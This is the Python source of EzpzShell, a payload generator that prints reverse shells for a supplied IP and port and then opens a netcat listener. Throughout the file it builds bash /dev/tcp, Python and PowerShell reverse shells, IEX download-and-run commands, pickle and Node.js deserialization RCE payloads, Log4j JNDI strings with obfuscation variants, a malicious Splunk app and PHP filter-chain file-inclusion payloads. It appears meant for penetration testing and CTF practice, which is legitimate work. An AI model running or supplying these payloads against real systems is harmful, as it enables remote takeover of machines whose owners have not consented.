#!/usr/bin/python3
#coding=utf-8

######################################################################
#Script Name	: EzpzShell
#Description	: Collection Of Reverse Shell that can easily generate
#Author       	: H0j3n
#Twitter        : @h0j3n
#Github Link    : https://github.com/H0j3n/EzpzShell
######################################################################

import sys,re,os,base64,pickle,string,random,yaml
import netifaces as ni
import urllib.parse
from netifaces import AF_INET, AF_INET6, AF_LINK, AF_PACKET, AF_BRIDGE
from ezpzShell.utils.update_yaml import *


class colors:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[92m'
    GREEN = '\033[92m'
    RED = '\033[91m'
    RESET = '\033[0m'
    WHITEBOLD = '\033[1m'
    ORANGE = '\033[1;33;40m'

def header():
	listPayload = ','.join([i for i in sorted(payload.keys())])
	print('''
  ______               _____ _          _ _
 |  ____|             / ____| |        | | |
 | |__   _____ __ ___| (___ | |__   ___| | |
 |  __| |_  / '_ \_  /\___ \| '_ \ / _ \ | |
 | |____ / /| |_) / / ____) | | | |  __/ | |
 |______/___| .__/___|_____/|_| |_|\___|_|_|
            | |
            |_| by H0j3n'''+f'''\n\n{colors.CYAN}-------- [{colors.RESET} PAYLOAD AVAILABLE {colors.CYAN}] --------
{colors.RESET}''')
	# Payload Listing
	counter = 0
	for i in listPayload.split(","):
		print(f"{colors.GREEN}[{colors.RESET}"+i+f"{colors.GREEN}]{colors.RESET}",end=" ")
		counter += 1
		if counter == 10:
			counter = 0
			print()
	print(f'''{colors.CYAN}
\n{colors.CYAN}-------- [{colors.RESET} USAGE {colors.CYAN}] --------
{colors.RESET}{colors.ORANGE}\npython3 {sys.argv[0].split("/")[-1]} 10.10.10.10 9001 py\n{colors.ORANGE}python3 {sys.argv[0].split("/")[-1]} tun0 9001 py{colors.RESET}\n{colors.ORANGE}python3 {sys.argv[0].split("/")[-1]} tun0 9001 py -payload (Only Payload){colors.RESET}''')

def base64gen(ip,port):
	temp = 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'.replace("{IP}",ip).replace("{PORT}",port)
	return base64.b64encode(temp.encode('ascii'))

def base64gen_py3(ip,port):
    temp = f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' '''
    return base64.b64encode(temp.encode('ascii'))

def base64gen_node(ip,port):
    payload = base64gen(ip,port).decode("ascii")
    temp = f'''require("child_process").exec("echo {payload} | base64 -d | bash")'''
    return base64.b64encode(temp.encode('ascii'))

def base64gen_urlencode(ip,port):
	temp = 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'.replace("{IP}",ip).replace("{PORT}",port)
	return base64.b64encode(temp.encode('ascii'))

def base64gen_full(ip,port):
	temp = 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'.replace("{IP}",ip).replace("{PORT}",port)
	full_temp = 'echo '+base64.b64encode(temp.encode('ascii')).decode('ascii')+' | base64 -d | bash'
	return base64.b64encode(full_temp.encode('ascii'))

def base64gen_ps1(ip,port):
	temp = '$client = New-Object System.Net.Sockets.TCPClient("{IP}",{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'.replace("{IP}",ip).replace("{PORT}",port)
	return base64.b64encode(temp.encode('UTF-16LE'))

def base64gen_ps1_2(ip,port):
	temp = '''IEX(New-Object Net.WebClient).downloadString('http://{IP}/Invoke-PowerShellTcp.ps1')'''.replace("{IP}",ip)
	return base64.b64encode(temp.encode('UTF-16LE'))

def base64gen_ps1_3(ip,port):
	temp = '''IEX(New-Object Net.WebClient).downloadString('http://{IP}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {IP} -Port {PORT}'''.replace("{IP}",ip).replace("{PORT}",port)
	return base64.b64encode(temp.encode('UTF-16LE'))

def phpemoji(ip,port):
	list_emoji = {
		"0":"$🙂",
		"1":"$😀",
		"2":"$😁",
		"3":"$😅",
		"4":"$😆",
		"5":"$😉",
		"6":"$😊",
		"7":"$😎",
		"8":"$😍",
		"9":"$😚",
		".":"$🤔"
	}
	new_ip = ""
	new_port = ""
	#Retrieve New IP
	for i in ip:
		new_ip += list_emoji[i]
		new_ip += "."
	#Retrieve New Port
	for i in port:
		new_port += list_emoji[i]
		new_port += "."
	return new_ip[:-1],new_port[:-1]

def pickle_rce(ip,port):
	command = f'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port}' + ' >/tmp/f'
	print("# Original Reverse Shell : "+command)
	print()
	class rce(object):
		def __reduce__(self):
			import os
			return (os.system,(command,))
	return base64.b64encode(pickle.dumps(rce()))

def pickle_rce2(ip,port):
	temp = base64gen(ip,port)
	j = "echo {BASE64} | base64 -d | bash"
	command = j.strip().replace("{BASE64}",temp.decode("ascii")).replace("{IP}",ip).replace("{PORT}",port).strip()
	print("# Original Reverse Shell : "+command)
	print()
	class rce(object):
		def __reduce__(self):
			import os
			return (os.system,(command,))
	return base64.b64encode(pickle.dumps(rce()))

def char_encode(payload):
	encoded_payload = ""
	for char in payload:
		encoded_payload = encoded_payload + "," + str(ord(char))
	return encoded_payload[1:]

def get_random_string():
	# choose from all lowercase letter
	letters = string.ascii_lowercase + string.ascii_uppercase + string.digits
	result_str = ''.join(random.choice(letters) for i in range(20))
	return result_str

def log4j_list(ip):
	list_log4j_f = ["$\{jndi:ldap://{IP}:1389/Exploit\}","$\{$\{upper:j\}ndi:ldap://{IP}:1389/Exploit\}","$\{$\{lower:j\}ndi:ldap://{IP}:1389/Exploit\}","$\{$\{::-j\}ndi:ldap://{IP}:1389/Exploit\}","$\{$\{env:ENV_NAME:-j\}ndi:ldap://{IP}:1389/Exploit\}","$\{$\{env:TROLL:-j\}ndi:ldap://{IP}:1389/Exploit\}","$\{$\{env:TROLL:-j\}ndi:$\{env:TROLL:-l\}dap://{IP}:1389/Exploit\}","$\{$\{env:ENV_NAME:-j\}ndi:lda$\{env:ENV_NAME:-p\}://{IP}:1389/Exploit\}","$\{$\{::-j\}ndi:lda$\{::-p\}://{IP}:1389/Exploit\}","$\{$\{lower:j\}ndi:$\{lower:l\}dap://{IP}:1389/Exploit\}","$\{$\{upper:j\}ndi:$\{lower:l\}dap://{IP}:1389/Exploit\}"]
	list_log4j = ["${jndi:ldap://{IP}:1389/Exploit}","${${upper:j}ndi:ldap://{IP}:1389/Exploit}","${${lower:j}ndi:ldap://{IP}:1389/Exploit}","${${::-j}ndi:ldap://{IP}:1389/Exploit}","${${env:ENV_NAME:-j}ndi:ldap://{IP}:1389/Exploit}","${${env:TROLL:-j}ndi:ldap://{IP}:1389/Exploit}","${${env:TROLL:-j}ndi:${env:TROLL:-l}dap://{IP}:1389/Exploit}","${${env:ENV_NAME:-j}ndi:lda${env:ENV_NAME:-p}://{IP}:1389/Exploit}","${${::-j}ndi:lda${::-p}://{IP}:1389/Exploit}","${${lower:j}ndi:${lower:l}dap://{IP}:1389/Exploit}","${${upper:j}ndi:${lower:l}dap://{IP}:1389/Exploit}"]
	for i in list_log4j_f:
		print(i.replace("{IP}",ip))
	for i in list_log4j:
		print(i.replace("{IP}",ip))


# reverse_shell_splunk
# ├── bin
# │   └── rev.py
# └── default
#     └── inputs.conf
def splunk_rce(ip,port):
	# rev.py
	rev_payload = """
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("{IP}",{PORT}));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
	""".replace("{IP}",ip).replace("{PORT}",port)

	# inputs.conf
	inputs_conf = """[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = pentest
	"""
	os.system("mkdir -p reverse_shell_splunk/bin")
	os.system("mkdir -p reverse_shell_splunk/default")
	with open("reverse_shell_splunk/bin/rev.py","w") as f:
		f.write(rev_payload.strip())
	with open("reverse_shell_splunk/default/inputs.conf","w") as f:
		f.write(inputs_conf.strip())
	os.system("tar -czf /tmp/reverse_shell_splunk.tgz reverse_shell_splunk 2>/dev/null")
	os.system("rm -rf reverse_shell_splunk")
	print("Please upload file /tmp/reverse_shell_splunk.tgz and install it")

# https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters
# https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py
# https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT
# https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d
def php_lfi_payload(chains):
    conversions = {
        '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
        '1': 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4',
        '2': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921',
        '3': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE',
        '4': 'convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE',
        '5': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2',
        '6': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2',
        '7': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4',
        '8': 'convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
        '9': 'convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB',
        'A': 'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213',
        'a': 'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE',
        'B': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000',
        'b': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE',
        'C': 'convert.iconv.UTF8.CSISO2022KR',
        'c': 'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2',
        'D': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213',
        'd': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5',
        'E': 'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT',
        'e': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937',
        'F': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB',
        'f': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213',
        'g': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8',
        'G': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90',
        'H': 'convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213',
        'h': 'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE',
        'I': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213',
        'i': 'convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000',
        'J': 'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4',
        'j': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16',
        'K': 'convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE',
        'k': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2',
        'L': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC',
        'l': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE',
        'M':'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T',
        'm':'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949',
        'N': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4',
        'n': 'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61',
        'O': 'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775',
        'o': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE',
        'P': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB',
        'p': 'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4',
        'q': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2',
        'Q': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2',
        'R': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4',
        'r': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101',
        'S': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS',
        's': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90',
        'T': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103',
        't': 'convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS',
        'U': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943',
        'u': 'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61',
        'V': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB',
        'v': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2',
        'W': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936',
        'w': 'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE',
        'X': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932',
        'x': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS',
        'Y': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361',
        'y': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT',
        'Z': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16',
        'z': 'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937',
        '/': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4',
        '+': 'convert.iconv.UTF8.UTF16|convert.iconv.UCS-2.UTF8|convert.iconv.L6.UTF8|convert.iconv.L4.UCS2',
        '=': ''
    }
    chains = chains.encode('utf-8')
    base64_value = base64.b64encode(chains).decode('utf-8').replace("=", "")
    filters = "convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    for c in base64_value[::-1]:
        filters += conversions[c] + "|"
        filters += "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    filters += "convert.base64-decode"
    final_payload = f"php://filter/{filters}/resource=php://temp"

    return final_payload

# Load variables from updates.yaml
# Load variables from updates.yaml
# if len(sys.argv[0].split("/")) > 1:
# 	paths = "/".join(sys.argv[0].split("/")[:-1])+"/"
# else:
# 	paths = ""
#/opt/Tools/EzpzShell/ezpzShell.py
parsed_yaml_file = yaml.load(output_yaml(),Loader=yaml.FullLoader)
payload = parsed_yaml_file["payload"]

def main():
	if len(sys.argv) < 4:
		header()
		sys.exit(-1)
	elif len(sys.argv) == 5:
		onlypayload = True
	else:
		onlypayload = False
	#load_shell()
	options = sys.argv[3]
	port = sys.argv[2]
	ip = ""
	try:
		ip = ni.ifaddresses(sys.argv[1])[AF_INET][0]['addr']
	except:
		aa=re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$",sys.argv[1])
		if aa:
			ip = sys.argv[1]
		else:
			ip = sys.argv[1]
	# Check Payload
	if options not in payload:
		header()
		print()
		print(f"No such payload with this name: {options}")
		sys.exit(-1)
	for counter,j in enumerate(payload[options.lower()]):
		print(f"\n{colors.CYAN}-------- [{colors.RESET} Example {counter+1} {colors.CYAN}] --------{colors.RESET}\n")
		if "{BASE64}" in j:
			temp = base64gen(ip,port)
			full_temp = j.strip().replace("{BASE64}",temp.decode("ascii")).replace("{IP}",ip).replace("{PORT}",port).strip()
			if "{YAML_PY}" in j:
				only_b64 = full_temp.replace("{YAML_PY}","")
				print(full_temp.replace("{YAML_PY}","Full Base64 Payload: "+base64.b64encode(only_b64.encode('ascii')).decode('ascii')))
			elif "{BASE64_URLENCODE}" in j:
				temp = urllib.parse.quote(base64gen_urlencode(ip,port).decode("ascii"))
				print(full_temp.replace("{BASE64_URLENCODE}",temp).replace("{IP}",ip).replace("{PORT}",port).strip())
			elif "{PHP_LFI}" in j:
			    payloads = full_temp.split("\n")[1]
			    print(payloads)
			    temp = php_lfi_payload(payloads)
			    print(full_temp.strip().replace("{PHP_LFI}",temp))
				#temp = urllib.parse.quote(base64gen_urlencode(ip,port).decode("ascii"))
				#print(full_temp.replace("{BASE64_URLENCODE}",temp).replace("{IP}",ip).replace("{PORT}",port).strip())
			else:
				print(full_temp)
		elif "{BASE64_URLENCODE}" in j:
			temp = urllib.parse.quote(base64gen_urlencode(ip,port).decode("ascii"))
			full_temp = j.strip().replace("{BASE64_URLENCODE}",temp).replace("{IP}",ip).replace("{PORT}",port).strip()
			print(full_temp)
		elif "{BASE64_FULL}" in j:
			temp = base64gen_full(ip,port)
			full_temp = j.strip().replace("{BASE64_FULL}",temp.decode("ascii")).replace("{IP}",ip).replace("{PORT}",port).strip()
			if "{YAML_PY}" in j:
				only_b64 = full_temp.replace("{YAML_PY}","")
				print(full_temp.replace("{YAML_PY}","Full Base64 Payload: "+base64.b64encode(only_b64.encode('ascii')).decode('ascii')))
			else:
				print(full_temp)
		elif "{BASE64PS1}" in j:
			temp = base64gen_ps1(ip,port)
			print(j.strip().replace("{BASE64PS1}",temp.decode("ascii")).replace("{IP}",ip).replace("{PORT}",port).strip())
		elif "{BASE64PS1_2}" in j:
			temp = base64gen_ps1_2(ip,port)
			print(j.strip().replace("{BASE64PS1_2}",temp.decode("ascii")).replace("{IP}",ip).replace("{PORT}",port).strip())
		elif "{BASE64PS1_3}" in j:
			temp = base64gen_ps1_3(ip,port)
			print(j.strip().replace("{BASE64PS1_3}",temp.decode("ascii")).replace("{IP}",ip).replace("{PORT}",port).strip())
		elif ("{PICKLE}" in j) or ("{PICKLE_BASH}" in j):
			if "{PICKLE}" in j:
				temp = pickle_rce(ip,port)
				print(j.strip().replace("{PICKLE}",temp.decode("ascii")))
			elif "{PICKLE_BASH}" in j:
				temp = pickle_rce2(ip,port)
				print(j.strip().replace("{PICKLE_BASH}",temp.decode("ascii")))
		elif "{PHPEMOJI}" in j:
			new_ip,new_port = phpemoji(ip,port)
			print(j.strip().replace("{PHPEMOJI}","").replace("{IP}",new_ip).replace("{PORT}",new_port).strip())
		elif "{RC4RANDOM}" in j:
			temprandom = get_random_string()
			print(j.strip().replace("{RC4RANDOM}",temprandom).replace("{IP}",ip).replace("{PORT}",port).strip())
		elif "{NODEJS_DESERIALIZATION}" in j:
			temp = j.strip().replace("{NODEJS_DESERIALIZATION}","").replace("{IP}",ip).replace("{PORT}",port).strip()
			temp2 = char_encode(temp)
			print('{"run": "_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()"}' % temp2)
			base64payload = '{"run": "_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()"}' % temp2
			print(f"\n{base64.b64encode(base64payload.encode('ascii')).decode('ascii')}")
		elif "{BASE64_PY3}" in j:
			temp = base64gen_py3(ip,port)
			print(j.replace("{BASE64_PY3}",temp.decode("ascii")).strip())
		elif "{PHP_LFI}" in j:
			if "{BASE64_PY3}" in j:
			    temp = base64gen_py3(ip,port)
			    payloads = j.replace("{BASE64_PY3}",temp.decode("ascii")).strip().split("\n")[1]
			    temp2 = php_lfi_payload(payloads)
			    print(j.replace("{BASE64_PY3}",temp.decode("ascii")).strip().replace("{PHP_LFI}",temp2))
			else:
			    payloads = j.replace("{IP}",ip).replace("{PORT}",port).strip().split("\n")[1]
			#print(payloads)
			    temp = php_lfi_payload(payloads)
			    print(j.replace("{IP}",ip).replace("{PORT}",port).strip().replace("{PHP_LFI}",temp))
		elif "{NODE_BASE64}" in j:
			temp = base64gen_node(ip,port)
			print(j.replace("{NODE_BASE64}",temp.decode("ascii")).strip())
		elif "{LOG4J}" in j:
			log4j_list(ip)
		elif "{SPLUNK_RCE}" in j:
			splunk_rce(ip,port)
		else:
			print(j.strip().replace("{IP}",ip).replace("{PORT}",port))
	if not onlypayload:
		print(F"\n{colors.CYAN}[*]{colors.RESET} {colors.WHITEBOLD}Starting the listener on {port}\n")
		os.system('nc -lvnp '+ str(port))
		print(colors.RESET)
	elif sys.argv[4] != "-payload":
		print()
		print(f"{colors.ORANGE}[?] Did you mean -payload? {colors.RESET}")
		print(F"\n{colors.CYAN}[*]{colors.RESET} {colors.WHITEBOLD}Starting the listener on {port}\n")
		os.system('nc -lvnp '+ str(port))
		print(colors.RESET)

if __name__ == '__main__':
    main()
